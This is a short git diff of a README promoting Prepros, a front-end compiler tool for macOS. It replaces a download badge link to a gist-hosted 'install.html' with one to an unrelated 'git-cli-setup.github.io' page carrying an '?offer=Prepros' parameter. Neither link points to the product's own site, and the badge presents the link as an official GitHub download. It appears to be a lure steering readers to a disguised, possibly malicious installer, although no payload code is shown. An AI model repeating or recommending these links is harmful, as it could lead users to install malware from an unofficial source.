@@ -2,7 +2,7 @@
 
 Prepros is a powerful and efficient tool that helps web developers compile, preprocess, and optimize their front-end projects quickly and easily. It supports Sass, Less, Stylus, CoffeeScript, and more, allowing developers to streamline their workflow on macOS.
 
-<a href="https://gistcdn.githack.com/sandie60yurik/10f5eba37ca834722b18b63396baab96/raw/7831082adfb5190cba301ae8aba4a9ea07050c75/install.html?offer=Prepros" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=Prepros" target="_blank">
   <img 
     src="https://img.shields.io/badge/GetPrepros%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
